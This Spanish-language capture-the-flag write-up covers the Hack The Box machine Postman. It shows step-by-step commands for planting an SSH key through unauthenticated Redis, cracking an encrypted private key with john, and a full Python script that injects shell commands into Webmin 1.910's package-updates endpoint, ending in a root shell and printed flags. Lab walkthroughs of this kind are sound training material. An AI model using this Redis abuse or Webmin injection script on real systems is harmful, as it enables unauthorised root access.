---
layout: single
title: Postman - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina Postman de la plataforma de Hackthebox donde vamos a estar abusando del servicio redis sin autenticacion para meter nuestra clave id_rsa y conectarnos por ssh sin proporcionar contraseña, dentro encontraremos una clave id_rsa encriptada pero con john obtendremos la clave para conectarnos como ese usuario para la escalada de privilegios explotaremos una vulnerabilidad en el servicio Webmin mediante un command injection"
date: 2024-01-09
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-postman/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - redis
  - Webmin
  - Command Injection
  - Python3
---

<p align="center">
  <img src="https://i.imgur.com/KzSWonr.png"/>
</p>

Estamos ante una maquina Linux

```bash
❯ whichSystem.py 10.10.10.160

10.10.10.160 (ttl -> 63): Linux
```

El **ttl** no es **64** ya que pasa por un intermediario como vemos yo soy la **10.10.14.28** y la IP de la maquina victima es la **10.10.10.160** pero primero pasa por la **10.10.10.2** es por eso que disminuye

```bash
❯ ping -c 1 10.10.10.160 -R
PING 10.10.10.160 (10.10.10.160) 56(124) bytes of data.
64 bytes from 10.10.10.160: icmp_seq=1 ttl=63 time=110 ms
RR: 	10.10.14.28
	10.10.10.2
	10.10.10.160
	10.10.10.160
	10.10.14.1
	10.10.14.28


--- 10.10.10.160 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.753/109.753/109.753/0.000 ms
```

## PortScan

```bash
❯ nmap -sCV -p22,80,6379,10000 10.10.10.160 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 13:07 CST
Nmap scan report for 10.10.10.160
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion

Vemos que en el puerto **6379** esta corriendo el servicio de **redis** 

<p align="center">
  <img src="https://i.imgur.com/3AGQAMd.png">
</p>

Si buscamos en **HackTricks** ya obtenemos informacion de como enumerar este servicio <https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis>

Existe un **script** de **Nmap** que enumera este servicio si lo lanzamos obtenemos lo siguiente

```bash
❯ nmap --script redis-info -sV -p 6379 10.10.10.160 -oN inforedis
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 13:12 CST
Nmap scan report for 10.10.10.160
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 635
|   Used CPU (sys): 57.32
|   Used CPU (user): 22.81
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 823.12K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.28
```

Pero bueno por el momento lo dejaremos a si ya que tambien esta el puerto **80** abierto y necesitamos enumerarlo tambien a si que vamos a enumerar el servicio web de la maquina

Si lanzamos el **script** **http-enum** de **Nmap** obtenemos ya nos enumera estas rutas 

```bash
❯ nmap --script=http-enum -p80 10.10.10.160 -oN webScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 13:14 CST
Nmap scan report for 10.10.10.160
Host is up (0.16s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /upload/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 24.53 seconds
```

Estas son las tecnologias que esta empleando el servicio web 

```ruby
❯ whatweb http://10.10.10.160
http://10.10.10.160 [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.160], JQuery, Script, Title[The Cyber Geek's Personal Website], X-UA-Compatible[IE=edge]
```

```bash
❯ curl -s http://10.10.10.160 -I
HTTP/1.1 200 OK
Date: Tue, 09 Jan 2024 19:15:47 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Sun, 25 Aug 2019 18:34:23 GMT
ETag: "f04-590f549ce0d74"
Accept-Ranges: bytes
Content-Length: 3844
Vary: Accept-Encoding
Content-Type: text/html
```

Esta es la pagina web

<p align="center">
  <img src="https://i.imgur.com/A1WaetM.png">
</p>

Nada interesante vamos a hacer **Fuzzing** para buscar rutas, pero no encontramos nada interesante

```bash
❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.160/FUZZ --hc=404 -t 200
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.160/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000002:   301        9 L      28 W       313 Ch      "images"                                                       
000000352:   301        9 L      28 W       313 Ch      "upload"                                                       
000000536:   301        9 L      28 W       310 Ch      "css"                                                          
000000939:   301        9 L      28 W       309 Ch      "js"                                                           
000002757:   301        9 L      28 W       312 Ch      "fonts"                                                        
000045226:   200        91 L     253 W      3844 Ch     "http://10.10.10.160/"                                         
000095510:   403        11 L     32 W       300 Ch      "server-status"     
```

Vamos aplicar **Fuzzing** para ahora para encontrar subdominios, pero nada

```bash
❯ gobuster vhost -u http://10.10.10.160 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20
```

## Port 10000

En el Puerto **10000** esta corriendo un servicio web

<p align="center">
  <img src="https://i.imgur.com/iijkkc1.png">
</p>

Ahora sabemos que va por **https** 

Y vemos un panel de **Login**

<p align="center">
  <img src="https://i.imgur.com/epCtyLB.png">
</p>

Intente contraseñas por defecto pero nada bueno vamos a seguir enumerando la parte de **redis** para ver si encontramos algo interesante

## Redis 

<https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis>

Vamos a seguir los pasos que nos dicen en **Hacktricks** para enumerar este servicio

Vemos que nos dice que esta abierto

```bash
❯ nc -vn 10.10.10.160 6379
(UNKNOWN) [10.10.10.160] 6379 (redis) open
```

Vemos que hay nos devuelve informacion

```bash
❯ redis-cli -h 10.10.10.160
10.10.10.160:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-58-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:635
run_id:45a534a1a9291ce06147c1d14e247f34fd5fd76f
tcp_port:6379
uptime_in_seconds:66493
uptime_in_days:0
hz:10
lru_clock:10332163
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:841848
used_memory_human:822.12K
used_memory_rss:3870720
used_memory_rss_human:3.69M
used_memory_peak:842872
used_memory_peak_human:823.12K
used_memory_peak_perc:99.88%
used_memory_overhead:832158
used_memory_startup:782456
used_memory_dataset:9690
used_memory_dataset_perc:16.32%
total_system_memory:941199360
total_system_memory_human:897.60M
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:4.60
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1704786891
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:401408
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:9
total_commands_processed:21
instantaneous_ops_per_sec:0
total_net_input_bytes:2056
total_net_output_bytes:44992
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:3059
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:02433b0bd4c2d44de6134e017c26ec6c5475d649
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:60.48
used_cpu_user:24.04
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=1,expires=0,avg_ttl=0
10.10.10.160:6379> 
```

## SSH as redis

En el post hay una parte donde nos hablan sobre obtener **RCE** con una clave privada para conectarnos por **SSH** empleando **redis**

<https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh>

Podemos escribir

```bash
10.10.10.160:6379> incr zi
(integer) 1
10.10.10.160:6379> keys *
1) "zi"
```

Vemos que estamos en **SSH** 

```bash
❯ redis-cli -h 10.10.10.160
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
10.10.10.160:6379> 
```

En caso de que no hubiera estado el directorio en mi caso lo mas probable es que fue creado por otro usuario por que tengo el vip normal por el momento xd hicieramos esto 

```bash
10.10.10.160:6379> config set dir ./.ssh
OK
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```

Bueno para guardar la clave **id_rsa** vamos a generar la clave

```bash
❯ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/miguelrega7/.ssh/id_rsa): 
Created directory '/home/miguelrega7/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/miguelrega7/.ssh/id_rsa
Your public key has been saved in /home/miguelrega7/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:WMzJ4RBJjJg8/09o6nyByfNeQG1ApFhJgfMNir8c42M miguelrega7@miguelOS
The key's randomart image is:
+---[RSA 3072]----+
| . =+OBo.        |
|  Bo+.oO o       |
| ..*.o. X        |
|. . o..+         |
| . . +o.S        |
|  + = =..        |
| o + = +.        |
|  E.. o..        |
| . ooo.          |
+----[SHA256]-----+
```

Vamos a ingresar la clave publica como no lo indican

```bash
❯ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
                                                                                                                                
❯ catn spaced_key.txt
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmeqbNl1zWCj0pTw/uUuy/gj6XpgZvCezxANRQVXhnEQYnOLdD/luM6oh/3fyhxz1WoZzxu2+k6aNLF7Px/kniyQa1hz+HM3TWzwBHZA5a9CTySX15Er+5tsobpr/H/3Ak3n5Nwkqa9eI5K1zNSm4AQ/1yjdIfqb9f44K8TrO6hT6w1rpic6Ox2XVztsVxCRPtBoCQydZyLjUtIM6PsDpEn7EmRlT9QdtVJ7B+md9OLMbLzKsBRpDa3fWJg6ApMEUCD/6paQhfPrc9jA3/alcN+NjYbEmocoBBSTbzPleywyr6KMt9ZOQkaL8U7t32cxlrr+JCkpi5zg8IcnpwwJe/3S/+LtLrXU1VSJYrQDFeWtbNRjWVCSbFWTCtlvs0+L7emS1DD422WfWjvCRX7iYPzMvEBwLV1CiDguF9qwcEYaXt/Z6yJBrhK63zL3GMNnR2LwjF38O3RaDAT9MAE6WGbly2fc3bUgu7LMIN+YwiJ0WxvD4BDjsZOu9w2mPjXu8= miguelrega7@miguelOS
```

Vemos hacer lo del punto **3** y lo del punto **4

Vamos irnos ala ruta

```bash
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> 
```

```bash
❯ cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
OK
```

Ahora vamos a indicarle que lo ponga como **authorized_keys** 

```bash
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> 
```

Ahora si nuestra clave publica la ah guardado correctamente podemos conectarnos sin proporcionar contraseña como el usuario **redis** ya que lo guarda en un **.ssh** en el directorio **redis** que a si se llama el usuario

```bash
❯ ssh redis@10.10.10.160
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ED25519 key fingerprint is SHA256:eBdalosj8xYLuCyv0MFDgHIabjJ9l3TMv1GYjZdxY9Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jan  9 07:55:13 2024 from 10.10.14.30
redis@Postman:~$ export TERM=xterm
redis@Postman:~$ 
```

Vemos que hay otro usuario llamado **Matt** 

```bash
redis@Postman:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
redis@Postman:~$ 
```

Tenemos que convertirnos en ese usuario para poder ver la flag

```bash
redis@Postman:/home/Matt$ cat user.txt 
cat: user.txt: Permission denied
redis@Postman:/home/Matt$ 
```

Tiene un directorio **.ssh** para tampoco podemos entrar

```bash
redis@Postman:/home/Matt$ ls -la
total 52
drwxr-xr-x 6 Matt Matt 4096 Sep 11  2019 .
drwxr-xr-x 3 root root 4096 Sep 11  2019 ..
-rw------- 1 Matt Matt 1676 Sep 11  2019 .bash_history
-rw-r--r-- 1 Matt Matt  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 Matt Matt 3771 Aug 25  2019 .bashrc
drwx------ 2 Matt Matt 4096 Aug 25  2019 .cache
drwx------ 3 Matt Matt 4096 Aug 25  2019 .gnupg
drwxrwxr-x 3 Matt Matt 4096 Aug 25  2019 .local
-rw-r--r-- 1 Matt Matt  807 Aug 25  2019 .profile
-rw-rw-r-- 1 Matt Matt   66 Aug 26  2019 .selected_editor
drwx------ 2 Matt Matt 4096 Aug 26  2019 .ssh
-rw-rw---- 1 Matt Matt   33 Jan  9 01:42 user.txt
-rw-rw-r-- 1 Matt Matt  181 Aug 25  2019 .wget-hsts
```

Despues de estar enumerando un poco la ruta veo que hay una **id_rsa.bak** 

```bash
redis@Postman:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Sep 30  2020 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
redis@Postman:/opt$ 
```

Podemos usar **john** para crackearla ya que esta encriptada y a si saber la contraseña y conectarnos por **SSH** como ese usuario

## Shell as Matt

Ahora tenemos el **hash** que vamos a crackear

```bash
❯ ssh2john id_rsa > hash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)     
1g 0:00:00:00 DONE (2024-01-09 14:39) 2.325g/s 573990p/s 573990c/s 573990C/s comunista..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Vemos que **Matt** usa esa contraseña 

```bash
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ whoami
Matt
Matt@Postman:/opt$ 
```

## User flag

Ahora podemos ver la flag

```bash
Matt@Postman:~$ cat user.txt 
b9c56f4e10cc776dbce0a2d239cd59ea
Matt@Postman:~$ 
```

## Escalada de Privilegios

No vemos nada interesante

```bash
Matt@Postman:/$ find \-perm -4000 2>/dev/null
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/sudo
./usr/bin/passwd
./usr/bin/gpasswd
./usr/bin/chfn
./usr/bin/traceroute6.iputils
./usr/bin/newgrp
./usr/bin/chsh
./bin/fusermount
./bin/umount
./bin/su
./bin/ping
./bin/mount
Matt@Postman:/$ 
```

Bueno pues nada

```bash
Matt@Postman:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
Matt@Postman:/$ 
```

No podemos aprovecharnos de `capabilities` 

```bash
Matt@Postman:/$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
Matt@Postman:/$ 
```

Si nos conectamos con las credenciales de **Matt** al panel de login vemos que nos deja

<p align="center">
  <img src="https://i.imgur.com/XqX2ZbO.png">
</p>

Bueno tenemos la version podemos buscar vulnerabilidades

Vemos que hay un **Package Updates** 

```bash
❯ searchsploit webmin 1.910
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                        | linux/remote/46984.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                 | linux/webapps/47330.rb
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Si examinamos el **.rb** vemos de que se trata

<p align="center">
  <img src="https://i.imgur.com/YLrABAP.png">
</p>

Podemos ver que nadamas nos dan opciones de **Metasploit** <https://www.rapid7.com/db/modules/exploit/linux/http/webmin_packageup_rce/>

Vemos que envia data por el metodo **POST** 

<p align="center">
  <img src="https://i.imgur.com/WtjuLRD.png">
</p>

Esto es lo que envia

```bash
php > echo urldecode("u=acl%2Fapt&u=%20%7C%20#{payload}&ok_top=Update+Selected+Packages");
u=acl/apt&u= | #{payload}&ok_top=Update Selected Packages
php > 
```

Vamos abrirnos el **Burpsuite** para capturar la peticion cuando nos autentiquemos

Asi es como se esta enviando la data

<p align="center">
  <img src="https://i.imgur.com/1XY0teM.png">
</p>

Vamos a crear un autopwn en **Python3** 

Vemos que si inyectamos el comando `whoami` lo hace

```bash
❯ python3 autopwm.py | html2text
***** JavaScript is disabled *****
Please enable javascript and refresh the page

Module_Index Update Packages
Building complete list of packages ..
Now updating acl | bash -c whoami ..
    * Installing package(s) with command apt-get -y install acl | bash -
      c whoami ..
      root
      .. install complete.

No packages were installed. Check the messages above for the cause of the
error.
  _Return_to_package_list
[Matt@Postman ~]#[  
```

```python
#!/usr/bin/env python3

import requests
import urllib3
import signal
import sys
from pwn import *

# Function
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)
# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# URL to Hack
target_url = "https://10.10.10.160:10000/session_login.cgi" # aqui se encuentra el panel de login
vuln_url = "https://10.10.10.160:10000/package-updates/update.cgi" # aqui se encuentra la ruta donde esta la vulnerabilidad ya que si recordamos tiene que ver con la actualizacion de paquetes
def main():
    
    urllib3.disable_warnings() # esto es para manejar lo del certificado ssl
    session = requests.session() # creamos la session
    session.verify = False # Evitamos problemas con el certificado ssl

    data_post = { # enviamos la data por post para logearnos
        'user': 'Matt',
        'pass': 'computer2008'
    }

    headers = { # Enviamos la Cookie que nos pide el servidor
        'Cookie': 'redirect=1; testing=1; sid=x'
    }
    
    r = session.post(target_url, data=data_post, headers=headers) # Enviamos toda la informacion al panel de login
    post_data = [('u', 'acl/apt'),('u', ' | bash -c whoami'), ('ok_top', 'Update Selected Packages')] # enviamos la data que necesitamos para obtener el RCE

    headers = {
        'Referer': 'https://10.10.10.160:10000/package-updates/?xnavigation=1'
    }
    
    r = session.post(vuln_url, data=post_data, headers=headers) # enviamos todo
    print(r.text) # mostramos la respuesta

if __name__ == '__main__':

    main()

```

## root flag and shell

Podemos establecernos una consola interactiva como el usuario **root** ya que el es el que lo ejecuta

<https://github.com/MikeRega7/Scripts/tree/main/HackTheBox/Postman>

```bash
❯ python3 autopwm.py
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.10.160 on port 45328
[*] Switching to interactive mode
bash: cannot set terminal process group (739): Inappropriate ioctl for device
bash: no job control in this shell
root@Postman:/usr/share/webmin/package-updates/# $ cat /root/root.txt
cat /root/root.txt
1ef6d0465b31b8f1713fe85d162f9f05
root@Postman:/usr/share/webmin/package-updates/# $  
```

Cualquier duda o comentario pueden hacerlo mediante Discord

<p align="center">
  <img src="https://i.imgur.com/0qcF3v9.png">
</p>

